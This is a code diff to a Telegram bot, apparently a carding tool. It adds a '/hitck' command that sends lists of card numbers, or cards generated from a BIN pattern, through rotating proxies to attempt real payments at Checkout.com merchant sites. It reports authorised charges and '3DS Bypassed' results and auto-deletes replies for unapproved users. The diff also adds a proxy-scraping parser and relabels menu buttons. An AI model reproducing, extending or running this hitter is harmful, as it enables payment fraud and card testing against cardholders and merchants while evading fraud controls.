@@ -175,7 +175,7 @@ async def command_start_handler(message: types.Message) -> None:
     from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
     
     markup = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎", callback_data="show_commands")]
+        [InlineKeyboardButton(text="COMMANDS", callback_data="show_commands")]
     ])
     
     welcome_text = (
@@ -194,8 +194,8 @@ async def cmds_command(message: types.Message) -> None:
     from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
     markup = InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="💳 𝙃𝙄𝙏𝙏𝙀𝙍", callback_data="menu_hitter"),
-            InlineKeyboardButton(text="🛠️ 𝙏𝙊𝙊𝙇𝙎", callback_data="menu_tools")
+            InlineKeyboardButton(text="💳 HITTER", callback_data="menu_hitter"),
+            InlineKeyboardButton(text="🛠 TOOLS", callback_data="menu_tools")
         ]
     ])
     commands_text = (
@@ -733,6 +733,157 @@ async def hit_command(message: types.Message):
                 
     asyncio.create_task(safe_run())
 
+
+@dp.message(Command("hitck"))
+async def hitck_command(message: types.Message):
+    user_id = message.from_user.id
+    
+    if user_id in active_sessions:
+        await message.answer("<b>Alert</b>\n<code>Active session detected. Abort current task before launching new checks.</code>")
+        return
+
+    if not await ProxyManager.has_proxies(user_id):
+        await message.answer(
+            "⚠️ <b>Proxy Required</b>\n"
+            "<code>Proxy pool is empty. You must load active proxies before hitting.\n"
+            "Load proxies using /proxy or /getproxy.</code>"
+        )
+        return
+
+    raw_tokens = message.text.strip().split()
+    if len(raw_tokens) < 3 and not (len(raw_tokens) == 3 or (len(raw_tokens) == 2 and any(c.isdigit() or c == 'x' for c in raw_tokens[-1]))):
+        await message.answer("<b>Error</b>\n<code>Invalid format. Usage:\n/hitck [url] [cc1] [cc2] ... (max 10 ccs)\nOR\n/hitck [url] [bin_pattern] [count=10]</code>")
+        return
+        
+    url = raw_tokens[1]
+    payload_tokens = raw_tokens[2:]
+    raw_payload = message.text.strip().split(None, 2)[2] if len(message.text.strip().split(None, 2)) >= 3 else (payload_tokens[0] if payload_tokens else "")
+    
+    cards, err = parse_cards_input(payload_tokens, raw_payload)
+    if err:
+        await message.answer(f"<b>Error</b>\n<code>{err}</code>")
+        return
+
+    status_msg = await message.answer("cooking....")
+    active_sessions[user_id] = True
+    
+    try:
+        from checkout_hitter import CheckoutHitter
+        proxy_data = await ProxyManager.get_random(user_id)
+        checkout_engine = CheckoutHitter(url, proxy_data=proxy_data)
+        
+        card_blocks = []
+        merchant_name = "Checkout.com Merchant"
+        amount_str = None
+        results = []
+
+        for idx, card in enumerate(cards, 1):
+            if user_id not in active_sessions:
+                break
+            res = await checkout_engine.hit(card, idx, user_id)
+            results.append(res)
+            
+            card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|{res['card']['cvv']}"
+            merchant_name = res.get('merchant') or merchant_name
+            if res.get('amount'):
+                amount_str = res['amount']
+
+            site_domain = extract_clean_site_domain(merchant_name, url)
+
+            if len(cards) > 1:
+                status_str = "Payment Successful ✅" if res['success'] else "Payment Failed ❌"
+                
+                if res['success']:
+                    resp_str = "Authorised"
+                    if res.get('3ds_resolved') or res.get('3ds_bypassed'):
+                        resp_str += " (3DS Bypassed)"
+                else:
+                    resp_str = res.get('error') or res.get('decline_code') or "Refused"
+
+                block = f"CC: <code>{card_str}</code>\nStatus: {status_str}\nResponse: {html.escape(resp_str)}"
+                
+                card_blocks.append(block)
+
+                site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
+                amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
+                blocks_text = "\n\n".join(card_blocks)
+
+                msg_text = (
+                    f"<b>Checkout.com Hitter</b>\n\n"
+                    f"{blocks_text}\n\n"
+                    f"{site_line}"
+                    f"{amt_line}"
+                )
+
+                try:
+                    await status_msg.edit_text(msg_text, disable_web_page_preview=True)
+                except Exception:
+                    pass
+
+        is_approved = user_id in approved_users_set
+
+        if len(cards) == 1 and results:
+            if status_msg:
+                try: await status_msg.delete()
+                except: pass
+
+            res = results[0]
+            card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|{res['card']['cvv']}"
+            merchant_name = res.get('merchant') or merchant_name
+            amount_val = res.get('amount') or amount_str or "USD 0.00"
+            site_domain = extract_clean_site_domain(merchant_name, url)
+            merchant_disp = f"{html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else html.escape(merchant_name)
+            note_line = "" if is_approved else "\n\n<i>Note: this message will be deleted automatically after 30sec</i>"
+            
+            if res['success']:
+                resp_str = "Authorised"
+                if res.get('3ds_resolved') or res.get('3ds_bypassed'):
+                    resp_str += " (3DS Bypassed)"
+                
+                receipt_str = ""
+                
+                time_str = f"{res.get('response_time', 0):.2f}s"
+                msg = (
+                    f"✅ <b>PAYMENT SUCCESSFUL</b>\n"
+                    f"💳 <code>{card_str}</code>\n"
+                    f"💰 Amount: {html.escape(amount_val)}\n"
+                    f"🛒 Merchant: {merchant_disp}\n"
+                    f"📉 Response: <code>{html.escape(resp_str)}</code>\n"
+                    f"⏱ {time_str}"
+                    f"{receipt_str}{note_line}"
+                )
+            else:
+                resp_str = res.get('error') or res.get('decline_code') or "Refused"
+                time_str = f"{res.get('response_time', 0):.2f}s"
+                
+                msg = (
+                    f"❌ <b>PAYMENT UNSUCCESSFUL</b>\n"
+                    f"💳 <code>{card_str}</code>\n"
+                    f"💰 Amount: {html.escape(amount_val)}\n"
+                    f"🛒 Merchant: {merchant_disp}\n"
+                    f"📉 Response: <code>{html.escape(resp_str)}</code>\n"
+                    f"⏱ {time_str}{note_line}"
+                )
+                
+            try:
+                msg_obj = await message.answer(msg, disable_web_page_preview=True)
+                if not is_approved:
+                    asyncio.create_task(delete_msg_later(msg_obj, 30))
+            except Exception as e:
+                print(e)
+                
+    except Exception as e:
+        import traceback
+        traceback.print_exc()
+        if status_msg:
+            await status_msg.edit_text(f"<b>Fatal Error</b>\n<code>{str(e)}</code>")
+        else:
+            await message.answer(f"<b>Fatal Error</b>\n<code>{str(e)}</code>")
+    finally:
+        if user_id in active_sessions:
+            del active_sessions[user_id]
+
+
 @dp.message(Command("hitad"))
 async def hitad_command(message: types.Message):
     user_id = message.from_user.id
@@ -1087,6 +1238,77 @@ def parse_proxy_line(line: str) -> Optional[Dict]:
             return {"raw": raw_line, "server": f"{scheme}://{parts[0]}:{parts[1]}"}
     return None
 
+
+def extract_all_proxies_from_text(raw_text: str) -> List[Dict]:
+    """
+    Extracts all valid proxies from raw text, removing emojis, unwanted text, bullet points, tags.
+    Supports formats:
+    - ip:port
+    - ip:port:user:pass
+    - user:pass@ip:port
+    - http(s)://...
+    - socks4/5://...
+    """
+    proxies = []
+    seen = set()
+    
+    text = re.sub(r'<[^>]+>', ' ', raw_text)
+    
+    # 1. user:pass@ip:port
+    pattern_user_pass_host = re.compile(
+        r'(?:(https?|socks[45])://)?([a-zA-Z0-9_\-\.]+):([a-zA-Z0-9_\-\.]+)'
+        r'@(\d{1,3}(?:\.\d{1,3}){3}):(\d{1,5})', re.I
+    )
+    for m in pattern_user_pass_host.finditer(text):
+        scheme = (m.group(1) or 'http').lower()
+        user, pwd, ip, port = m.group(2), m.group(3), m.group(4), m.group(5)
+        raw_p = f"{ip}:{port}:{user}:{pwd}"
+        if raw_p not in seen:
+            seen.add(raw_p)
+            proxies.append({
+                "raw": raw_p,
+                "server": f"{scheme}://{ip}:{port}",
+                "username": user,
+                "password": pwd
+            })
+
+    # 2. ip:port:user:pass
+    pattern_host_port_user_pass = re.compile(
+        r'(?:(https?|socks[45])://)?(\d{1,3}(?:\.\d{1,3}){3}):(\d{1,5})'
+        r':([a-zA-Z0-9_\-\.]+):([a-zA-Z0-9_\-\.]+)', re.I
+    )
+    for m in pattern_host_port_user_pass.finditer(text):
+        scheme = (m.group(1) or 'http').lower()
+        ip, port, user, pwd = m.group(2), m.group(3), m.group(4), m.group(5)
+        raw_p = f"{ip}:{port}:{user}:{pwd}"
+        if raw_p not in seen:
+            seen.add(raw_p)
+            proxies.append({
+                "raw": raw_p,
+                "server": f"{scheme}://{ip}:{port}",
+                "username": user,
+                "password": pwd
+            })
+
+    # 3. ip:port
+    pattern_ip_port = re.compile(
+        r'(?:(https?|socks[45])://)?(\d{1,3}(?:\.\d{1,3}){3}):(\d{1,5})', re.I
+    )
+    for m in pattern_ip_port.finditer(text):
+        scheme = (m.group(1) or 'http').lower()
+        ip, port = m.group(2), m.group(3)
+        raw_p = f"{ip}:{port}"
+        if not any(ip in p['server'] and port in p['server'] for p in proxies):
+            if raw_p not in seen:
+                seen.add(raw_p)
+                proxies.append({
+                    "raw": raw_p,
+                    "server": f"{scheme}://{ip}:{port}"
+                })
+                
+    return proxies
+
+
 @dp.message(Command("proxy", "setproxy", "chkproxy", "checkproxy"))
 async def proxy_command(message: types.Message):
     user_id = message.from_user.id
@@ -1159,8 +1381,8 @@ async def proxy_command(message: types.Message):
         from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
         buttons = []
         if len(premium_raws) > 0:
-            buttons.append([InlineKeyboardButton(text=f"Add Premium Only ({len(premium_raws)})", callback_data="add_strong_only")])
-        buttons.append([InlineKeyboardButton(text=f"Add All Live ({live_count})", callback_data="add_live_all")])
+            buttons.append([InlineKeyboardButton(text=f"➕ ADD PREMIUM ONLY ({len(premium_raws)})", callback_data="add_strong_only")])
+        buttons.append([InlineKeyboardButton(text=f"➕ ADD ALL LIVE ({live_count})", callback_data="add_live_all")])
         
         markup = InlineKeyboardMarkup(inline_keyboard=buttons)
         await status_msg.edit_text(final_msg, reply_markup=markup)
@@ -1198,7 +1420,7 @@ async def proxy_command(message: types.Message):
             
             from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
             markup = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text=f"Purge Weak IPs ({weak_count})", callback_data="rm_weak_proxies")]
+                [InlineKeyboardButton(text=f"❌ PURGE WEAK IPS ({weak_count})", callback_data="rm_weak_proxies")]
             ])
             
         try:
@@ -1368,8 +1590,8 @@ async def getproxy_command(message: types.Message):
     
     from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
     markup = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=f"➕ Add All Live ({len(live_proxies)}) to Pool", callback_data="add_scraped_all")],
-        [InlineKeyboardButton(text="⚡ Add Fast IPs Only (< 2s)", callback_data="add_scraped_fast")]
+        [InlineKeyboardButton(text=f"➕ ADD ALL SCRAPED ({len(live_proxies)}) TO POOL", callback_data="add_scraped_all")],
+        [InlineKeyboardButton(text="⚡ ADD FAST IPS ONLY (< 2S)", callback_data="add_scraped_fast")]
     ])
     
     try:
@@ -1933,8 +2155,8 @@ async def process_show_commands(callback: types.CallbackQuery):
     from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
     markup = InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="💳 𝙃𝙞𝙩𝒕𝒆𝒓", callback_data="menu_hitter"),
-            InlineKeyboardButton(text="🛠️ 𝙏𝒐𝒐𝒍𝒔", callback_data="menu_tools")
+            InlineKeyboardButton(text="💳 HITTER", callback_data="menu_hitter"),
+            InlineKeyboardButton(text="🛠 TOOLS", callback_data="menu_tools")
         ]
     ])
     commands_text = (
@@ -1952,7 +2174,7 @@ async def process_show_commands(callback: types.CallbackQuery):
 async def process_menu_hitter(callback: types.CallbackQuery):
     from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
     markup = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔙 𝘽𝘼𝘾𝙆", callback_data="menu_main")]
+        [InlineKeyboardButton(text="🔙 BACK", callback_data="menu_main")]
     ])
     hitter_text = (
         "💳 <b>HITTER COMMANDS</b>\n"
@@ -1977,7 +2199,7 @@ async def process_menu_tools(callback: types.CallbackQuery):
     
     from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
     markup = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔙 𝘽𝘼𝘾𝙆", callback_data="menu_main")]
+        [InlineKeyboardButton(text="🔙 BACK", callback_data="menu_main")]
     ])
     
     tools_text = (
